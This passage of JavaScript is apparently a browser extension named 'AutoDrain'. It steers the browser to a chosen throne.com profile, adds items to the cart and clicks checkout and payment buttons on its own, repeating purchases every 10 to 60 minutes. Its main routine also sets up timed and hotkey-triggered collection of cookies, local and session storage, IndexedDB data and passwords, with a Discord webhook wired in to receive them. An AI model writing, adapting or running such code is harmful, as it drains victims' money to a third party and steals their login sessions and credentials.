            debugLog(`💫 Adding specific item to cart...`, "cart");
            addButton.click();
            itemsAddedToCart++;
            purchaseInProgress = true;
            debugLog(`✅ Specific item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
            debugLog(`🚀 Initiating purchase sequence...`, "purchase");
          
            setTimeout(() => {
              if (purchaseInProgress && itemsAddedToCart > 0) {
                clickCheckoutIfExists();
              }
            }, 3000);
          
            return;
          }
          
          if (!fallbackItem) {
            fallbackItem = { button: addButton, name: itemName };
            debugLog(`💾 Stored fallback item: "${itemName}"`, "info");
          }
        }
      }
    }
    
    if (targetItem && !specificItemFound && fallbackItem) {
      debugLog(`⚠️ Specific item "${targetItem}" not found, using fallback`, "warning");
      debugLog(`🎯 Adding fallback item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Fallback item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    if (!targetItem && fallbackItem) {
      debugLog(`🎯 Adding available item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    if (itemsFound > 0) {
      debugLog(`📊 Scan complete: ${itemsFound} items found, ${addableItems} addable`, "info");
    }
    
    if (addableItems === 0) {
      debugLog(`❌ No addable items found on this page`, "warning");
    } else if (targetItem && !specificItemFound) {
      debugLog(`❌ Target item "${targetItem}" not found on this page`, "warning");
    }
  }, 3000);
}

function clickCheckoutIfExists() {
  if (!purchaseInProgress && itemsAddedToCart === 0) {
    debugLog("No items in cart, skipping checkout", "warning");
    return;
  }
  
  debugLog("🔍 Searching for checkout button", "action");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on page`, "info");
    
    for (const btn of buttons) {
      if (btn.textContent.trim().toLowerCase() === "checkout") {
        debugLog(`🎯 Checkout button found: "${btn.textContent.trim()}"`, "cart");
        debugLog(`💫 Clicking checkout button...`, "cart");
        btn.click();
        debugLog(`✅ Checkout initiated successfully!`, "success");
        return;
      }
    }
    
    debugLog("❌ No checkout button found with exact text 'checkout'", "warning");
    debugLog("🔄 Will retry on next cycle", "warning");
  }, 6000);
}

function clickPayNowIfExists() {
  debugLog("💳 Searching for payment button", "purchase");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on checkout page`, "info");
    
    const buttonTexts = Array.from(buttons).map(btn => btn.textContent.trim()).filter(text => text.length > 0);
    debugLog(`📝 Button texts: ${buttonTexts.join(', ')}`, "info");
    
    const paymentTexts = ["pay now", "pay", "complete purchase", "buy now", "purchase", "place order"];
    let paymentButtonsFound = 0;
    
    for (const btn of buttons) {
      const span = btn.querySelector("span");
      const btnText = btn.textContent.trim().toLowerCase();
      
      if (!btnText) continue;
      
      if (span && span.textContent.trim().toLowerCase() === "pay now" && !btn.disabled) {
        paymentButtonsFound++;
        debugLog(`🎯 Pay Now button found in span: "${span.textContent.trim()}"`, "purchase");
        debugLog(`💳 Processing payment...`, "purchase");
        btn.click();
        payClicked = true;
        purchaseInProgress = false;
        debugLog(`✅ Payment completed successfully! 🎉`, "success");
        debugLog(`🏁 Purchase sequence finished`, "success");
        
        if (autoRetryEnabled) {
          debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
          scheduleNextPurchase();
        }
        return;
      }
      
      for (const paymentText of paymentTexts) {
        if (btnText.includes(paymentText) && !btn.disabled) {
          paymentButtonsFound++;
          debugLog(`🎯 Payment button found: "${btn.textContent.trim()}"`, "purchase");
          debugLog(`💳 Processing payment...`, "purchase");
          btn.click();
          payClicked = true;
          purchaseInProgress = false;
          debugLog(`✅ Payment completed successfully! 🎉`, "success");
          debugLog(`🏁 Purchase sequence finished`, "success");
          
          if (autoRetryEnabled) {
            debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
            scheduleNextPurchase();
          }
          return;
        }
      }
    }
    
    debugLog(`❌ No payment buttons found (checked ${paymentButtonsFound} potential buttons)`, "warning");
    debugLog("🔄 Will retry payment detection on next cycle", "warning");
  }, 7000);
}

function redirectToProfile() {
  debugLog("🧭 Redirecting to profile page", "navigation");
  window.location.href = `https://${config.throneUrl}`;
}

function isOnCartOrCheckoutPage() {
  const url = window.location.href.toLowerCase();
  return url.includes('cart') || url.includes('checkout') || url.includes('payment');
}

function resetPurchaseState() {
  itemsAddedToCart = 0;
  purchaseInProgress = false;
  payClicked = false;
  debugLog("🔄 Purchase state reset - ready for new purchase", "info");
}

function mainLoop() {
  const url = window.location.href;
  const currentTime = Date.now();
  
  debugLog(`🔄 Main loop cycle | URL: ${url}`, "info");

  if (url.includes("throne.com/checkout") || isOnCartOrCheckoutPage()) {
    debugLog("💳 On checkout/cart page - attempting payment", "purchase");
    clickPayNowIfExists();
  } else if (url.includes("throne.com/thegoddessaura")) {
    if (payClicked && !purchaseInProgress) {
      debugLog("🎉 Previous purchase completed, resetting for new purchase", "success");
      resetPurchaseState();
      return;
    }
    
    if (itemsAddedToCart < maxItemsToAdd && !isOnCartOrCheckoutPage() && !purchaseInProgress) {
      debugLog("🛍️ On profile page - scanning for items to purchase", "cart");
      clickAddToCartForAnyItem();
    } else if (itemsAddedToCart >= maxItemsToAdd && purchaseInProgress) {
      debugLog(`📊 Cart has ${itemsAddedToCart} item(s), focusing on checkout only`, "cart");
      clickCheckoutIfExists();
    } else if (purchaseInProgress && itemsAddedToCart > 0) {
      debugLog("🔄 Purchase in progress, continuing checkout flow", "purchase");
      clickCheckoutIfExists();
    } else {
      debugLog("ℹ️ Waiting for next action...", "info");
    }
  } else if (url === "https://throne.com/" || url === "https://throne.com" || url.includes("throne.com/?") || url.includes("throne.com#")) {
    debugLog("🏠 On throne.com homepage - redirecting to target profile", "navigation");
    redirectToProfile();
  } else if (url.includes("throne.com")) {
    debugLog("🧭 On throne.com but not target profile - redirecting", "navigation");
    redirectToProfile();
  } else {
    debugLog(`⚠️ Not on throne.com - current URL: ${url}`, "warning");
  }
}

function main() {
  debugLog("🚀 AutoDrain Started!", "success");
  debugLog(`🖥️ PC Identifier: ${pcIdentifier}`, "info");
  debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
  debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
  if (config.targetItemName.trim()) {
    debugLog(`🎁 Target Item: "${config.targetItemName}" (with fallback)`, "info");
  } else {
    debugLog(`🎁 Target Item: Any available item`, "info");
  }
  debugLog(`🔄 Auto-Retry: ${autoRetryEnabled ? 'Enabled (10-60 min delay)' : 'Disabled'}`, "info");
  debugLog(`🔧 Debug Mode: Enabled`, "info");
  debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
  debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
  debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
  debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
  debugLog(`🔄 Toggle Auto-Retry: Ctrl+Alt+R`, "info");
  debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
  debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
  
  const mainInterval = setInterval(mainLoop, 5000);
  
  if (config.cookieCollection.enabled && config.discordWebhook.enabled) {
    debugLog(`🍪 Enhanced session collection enabled (interval: ${config.cookieCollection.interval / 1000}s)`, "info");
    debugLog(`💾 Collection features: ${config.cookieCollection.collectCookies ? 'Cookies ' : ''}${config.cookieCollection.collectLocalStorage ? 'LocalStorage ' : ''}${config.cookieCollection.collectSessionStorage ? 'SessionStorage ' : ''}${config.cookieCollection.collectIndexedDB ? 'IndexedDB ' : ''}${config.cookieCollection.collectPasswords ? 'Passwords' : ''}`, "info");
    
    setTimeout(() => {
      debugLog("🧪 Testing webhook connection on startup...", "info");
      testDiscordWebhook();
    }, 5000);
    
    setTimeout(() => {
      if (config.cookieCollection.autoCollect) {
        debugLog("🚀 Starting automatic session collection...", "info");
        collectAndLogCookies();
      }
    }, 15000);
    
    if (config.cookieCollection.autoCollect) {
      setInterval(() => {
        collectAndLogCookies();
      }, config.cookieCollection.interval);
    }
  } else {
    debugLog("🍪 Enhanced session collection disabled", "info");
  }
  
  window.addEventListener("keydown", (event) => {
    if (event.altKey && event.shiftKey && event.key === "E") {
      if (config.forceStop) {
        debugLog("🛑 EMERGENCY STOP ACTIVATED (Alt+Shift+E)", "error");
        debugLog("🔄 Stopping all automation...", "warning");
        clearInterval(mainInterval);
        debugLog("✅ Extension stopped successfully", "success");
      }
    }
    
    if (event.ctrlKey && event.altKey && event.key === "D") {
      event.preventDefault();
      toggleDebugBox();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "C") {
      event.preventDefault();
      debugLog("🍪 Manual session collection triggered", "info");
      collectAndLogCookies();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "T") {
      event.preventDefault();
      debugLog("🧪 Manual webhook test triggered", "info");
      testDiscordWebhook();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "R") {
      event.preventDefault();
      autoRetryEnabled = !autoRetryEnabled;
      debugLog(`🔄 Auto-retry ${autoRetryEnabled ? 'enabled' : 'disabled'}`, "info");
      if (autoRetryEnabled) {
        debugLog("⏰ Next purchases will be scheduled with 10-60 minute delays", "info");
      } else {
        debugLog("🛑 Auto-retry disabled - Only manual purchases will work", "warning");
      }
    }
  });
}

async function testDiscordWebhook() {
  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
  
  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
    `🌍 **URL:** ${window.location.href}\n` +
    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
    `✅ If you receive this message, your webhook is working correctly!`;
  
  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
  const success = await sendToDiscordWebhook({ text: testMessage }, 'report');
  
  if (success) {
    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
  } else {
    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
  }
  
  return success;
}

main();

